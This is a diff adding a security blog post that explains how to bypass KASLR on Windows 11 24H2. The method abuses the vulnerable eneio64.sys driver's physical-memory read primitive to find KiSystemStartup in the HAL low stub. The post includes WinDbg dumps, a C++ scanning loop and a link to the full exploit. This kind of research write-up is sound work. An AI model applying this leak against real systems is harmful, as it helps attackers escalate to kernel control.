@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>Breaking KASLR on Windows 11 24H2 using an HVCI-compatible Driver with Physical Memory Access</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-coy.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/default.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+
+        <script src="js/imagezoom.js"> </script>
+        <link rel="stylesheet" href="css/imagezoom.css">
+    </head>
+
+    <style>
+        body {
+            color: black;
+            zoom: 90%;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #dddddd;
+            text-align: left;
+            padding: 8px;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+
+        pre {
+            font-size:  12px;
+        }
+
+        .blue-text {
+            color: #182C61;
+        }
+
+        code {
+            color: black;
+        }
+
+        a {
+            text-decoration: underline;
+        }
+
+        pre code {
+            color: black;
+        }
+
+        .no-underline {
+            text-decoration: none;
+        }
+
+    </style> 
+    <body style="font-size: 17px; zoom: 90%;">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand no-underline" href="index.html">Yazid's notes</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4 no-underline" href="index.html">Home</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4 no-underline" href="about.html">About</a></li>                    
+                    </ul>
+                </div>
+            </div>
+        </nav>
+
+        <header class="masthead" style="background-image: url('assets/img/étoiles_ciel_nuit.png')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>Circumventing Leak Restrictions and Breaking KASLR on Windows 11 24H2 using an HVCI-compatible Driver with Physical Memory Access.</h1>
+                            <h2 class="subheading">Silly method to obtain the NTOS base address by leveraging the eneio64.sys driver, which provides read/write primitives on the system’s physical memory.</h2>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!" class="no-underline">Yazid</a>
+                                on June 9, 2025
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4" style=" text-align: justify; ">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+
+                        <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="assets/img/ntos-address-leak.png">
+                        </div>    
+
+                        <br><br>
+                        Well think of this post as a continuation of <a target="_blank" href="https://xacone.github.io/eneio-driver.html"><b>my previous blog post</b></a> on exploiting the HVCI-compatible <b><a target="_blank" href="https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/">eneio64.sys</a></b> kernel driver, which I achieved by simulating the translation of physical addresses into virtual addresses using paging structures. The truth is, I hesitated for a long time about doing this blog post, telling myself that I was too trivial and I'm probably missing something, but I'm doing it anyway, we never know. The aim of this very short blog post is to propose an alternative way of leaking the NTOS address on Windows 11 24H2 when exploiting a driver with R/W primitives on <b>physical memory</b>.
+
+<br>
+                        <br>
+
+                        In the previous post, I leveraged the Low Stub, which is present in the physical memory layout of systems that enable HVCI, to retrieve the value of CR3 in order to initiate the process of translating <b>leaked</b> virtual addresses into physical addresses, since I'm exploiting a driver that only provides access on physical memory, so as to make any exploitation technique possible on this driver as on a driver exposing R/W primitives on virtual memory. Since Windows 11 24H2, it is no longer possible to rely on EnumDeviceDriver sor NtQuerySystemInformation to leak, among other things, kernel module addresses from an average integrity process, and SeDebugPrivilege is now required for this. <a target="_blank" href="https://windows-internals.com/kaslr-leaks-restriction/">This blog post by Yarden Shafir</a> details these changes at the kernel level. There are tools like <a target="_blank" href="https://github.com/exploits-forsale/prefetch-tool">prefetch-tool</a>, which <a target="_blank" href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/#Bypassing-KASLR-Mitigation-in-24H2">leverages the leftovers of KVA Shadow</a> on modern CPUs for <b>guessing</b> the NTOS address, this one worked on my host machine but for an unknown reason, not on my Windows 11 24H2 VM with which I'm working on this blog post.
+
+                        <br>
+                        <br>
+
+                        The thing is, the low stub doesn't just provide control registers, but a lot of other things, including NTOS kernel addresses of <b>non-exported functions</b>, so even if you recover these addresses, you don't really know what they correspond to (<i>if you don't hardcode their offset, which is something we will avoid</i>). 
+Many of these addresses are specific to the HAL layer, this can be seen by unrolling the LowStub to which HalpLowStub points:
+
+<br><br>
+
+                        <pre class="text" style="color: black;"><code><b>0: kd> dqs poi(HalpLowStub) L0n1000</b>
+
+fffff7d7`8000b000  00000001`00064de9
+fffff7d7`8000b008  1018003f`00000001
+
+[...]
+
+fffff7d7`8000eff0  00000000`00000000
+fffff7d7`8000eff8  00000000`00000000
+fffff7d7`8000f000  fffff801`5f863d10 nt!HalpRegisteredInterruptControllers
+fffff7d7`8000f008  fffff801`5f863d10 nt!HalpRegisteredInterruptControllers
+fffff7d7`8000f010  fffff7d7`8000f178
+fffff7d7`8000f018  00000000`00000030
+fffff7d7`8000f020  fffff801`5ef71710 nt!HalpApicInitializeLocalUnit
+fffff7d7`8000f028  fffff801`5ef9f4e0 nt!HalpApicInitializeIoUnit
+fffff7d7`8000f030  fffff801`5ef72820 nt!HalpApicSetPriority
+fffff7d7`8000f038  fffff801`5efb0860 nt!HalpApicGetLocalUnitError
+fffff7d7`8000f040  fffff801`5efb0470 nt!HalpApicClearLocalUnitError
+fffff7d7`8000f048  00000000`00000000
+fffff7d7`8000f050  00000000`00000000
+fffff7d7`8000f058  00000000`00000000
+fffff7d7`8000f060  fffff801`5f127cf0 nt!HalpApicWriteEndOfInterrupt
+fffff7d7`8000f068  fffff801`5f013ae0 nt!HalpApicX2EndOfInterrupt
+fffff7d7`8000f070  fffff801`5ef9de00 nt!HalpApicSetLineState
+fffff7d7`8000f078  fffff801`5ef1ea90 nt!HalpApicRequestInterrupt
+fffff7d7`8000f080  fffff801`5efaa050 nt!HalpApicStartProcessor
+fffff7d7`8000f088  fffff801`5efa7e20 nt!HalpApicGenerateMessage
+fffff7d7`8000f090  fffff801`5efaca70 nt!HalpApicConvertId
+fffff7d7`8000f098  fffff801`5f132b80 nt!HalpApicSaveLocalInterrupts
+fffff7d7`8000f0a0  fffff801`5f132aa0 nt!HalpApicReplayLocalInterrupts
+fffff7d7`8000f0a8  fffff801`5f127b50 nt!HalpApicDeinitializeLocalUnit
+fffff7d7`8000f0b0  00000000`00000000
+fffff7d7`8000f0b8  fffff801`5efc8f60 nt!HalpApicQueryAndGetSource
+fffff7d7`8000f0c0  00000000`00000000
+fffff7d7`8000f0c8  00000000`00000000
+fffff7d7`8000f0d0  00000000`00000000
+
+[...]</code></pre>
+
+<br>
+
+The low stub is always between the physical address 0x10000 and 0x20000 (to be broad). Here, it is located at physical address <code>0x11000</code>:
+
+<br><br>
+
+<pre class="text"><code><b>0: kd> ? poi(HalpLowStub)</b>
+
+Evaluate expression: -8970039152640 = fffff7d7`8000b000
+0: kd> !vtop 7d5000 fffff7d78000b000
+Amd64VtoP: Virt fffff7d78000b000, pagedir 00000000007d5000
+Amd64VtoP: PML4E 00000000007d5f78
+Amd64VtoP: PDPE 00000000f7f02af0
+Amd64VtoP: PDE 00000000f7f05000
+Amd64VtoP: PTE 00000000f7f06058
+Amd64VtoP: Mapped phys 0000000000011000
+Virtual address fffff7d78000b000 translates to physical address 11000.
+</code></pre>
+
+<br>
+
+One address in particular caught my eye, that of KiSystemStartup, which is relatively early in the low stub:
+
+<br><br>
+
+<pre class="text"><code>2: kd> dqs poi(HalpLowStub) L0n10000
+
+[...]
+
+fffff7ef`4000b278  fffff806`1c087010 <b style="color: red;">nt!KiSystemStartup</b>
+
+[...]
+</code></pre>
+
+<br>
+
+KiSystemStartup is no more than the <b>entry point</b> of the kernel! whose RVA can easily be retrieved by parsing the PE image of ntoskrnl.exe:
+
+<br><br>
+
+<pre class="text"><code>0: kd> lmmnt
+Browse full module list
+start             end                 module name
+<b>fffff801`5ec00000</b> fffff801`5fc47000   nt         (pdb symbols) 
+
+<b>0: kd> dx ((nt!_IMAGE_NT_HEADERS64*)(0xfffff801`5ec00000+0n280))->OptionalHeader.AddressOfEntryPoint</b>
+[...] : <b>0xa87010</b> [Type: unsigned long]
+</code></pre>
+
+<br>
+
+The Windows kernel aligns to 2MB boundaries since it leverages large-page memory mappings:
+
+<br><br>
+
+<pre class="text"><code>0: kd> !pte fffff801`5ec00000
+                                           VA fffff8015ec00000
+PXE at FFFF8542A150AF80    PPE at FFFF8542A15F0028    PDE at FFFF8542BE0057B0    PTE at FFFF857C00AF6000
+contains 000000001000B063  contains 000000001000C063  contains 8A000001004001A1  contains 0000000000000000
+pfn 1000b     ---DA--KWEV  pfn 1000c     ---DA--KWEV  pfn 100400    -GL-A--KR-V  <b style="color: black;">LARGE PAGE</b> pfn 100400    
+
+0: kd> ? fffff801`5ec00000 % 200000
+Evaluate expression: 0 = 00000000`00000000
+</code></pre>
+
+<br>
+
+In this way, we can scan the Low Stub for an address suffixed with the last 3 bytes of the entry point's RVA. If we find this address, we simply subtract the value of the entry point's RVA, which gives us the kernel's address :)
+
+<br><br>
+
+<pre class="cpp"><code>for (physical_offset = 0x10000; physical_offset < 0x20000; physical_offset += sizeof(UINT64)) {
+
+        UINT64 qword_value = ReadMemoryU64(memory_data, physical_offset);
+
+        if ((qword_value & 0xFFFFF) == (ntosEntryPoint & 0xFFFFF)) {
+            
+            printf("[*] Found KiSystemStartup -> %p\n", qword_value);
+
+            UINT64 supposedNtosBase = (qword_value - ntosEntryPoint);
+
+            printf("[*] In a silly way, we can assume NTOS base address is %p\n", supposedNtosBase);
+
+        }    
+}
+</code></pre>
+
+<br>
+
+<a target="_blank" href="https://github.com/Xacone/Eneio64-Driver-Exploit/blob/main/kaslr/main.cpp">The full "exploit" is available here</a>. Below is the result on Windows 11 24H2 (build 10.0.26100.3194):
+
+<br><br>
+
+   <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="assets/img/leak-result.png">
+                        </div>    
+
+    <br>
+
+You now have an idea of the alternative you can use if you need to exploit a kernel driver offering R/W primitives on physical memory (as here with eneio64.sys) on Windows 11 24H2, we now have the kernel address which can allow us to continue using the <a href="https://xacone.github.io/eneio-driver.html">technique illustrated in the previous post</a>, albeit with a few changes in that we have to start from the kernel address to retrieve the address of kernel objects, but it's still feasible. Let me know if you have any constructive remarks! (Discord: yazidou)
+
+<br><br>
+
+Will life get easier with vulnerable drivers that operate on physical memory? Only time will tell. :p
+
+<br><br>
+<h4>References</h4>
+<ul style="font-style: italic;">
+    <li><a href="https://standa-note.blogspot.com/2020/03/initializing-application-processors-on.html">Satoshi Tanda - Initializing Application Processors on Windows</a></li>
+</ul>        
+
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="http://github.com/xacone">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic"></div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+    <script>
+        Prism.highlightAll();
+      </script>
+</html>
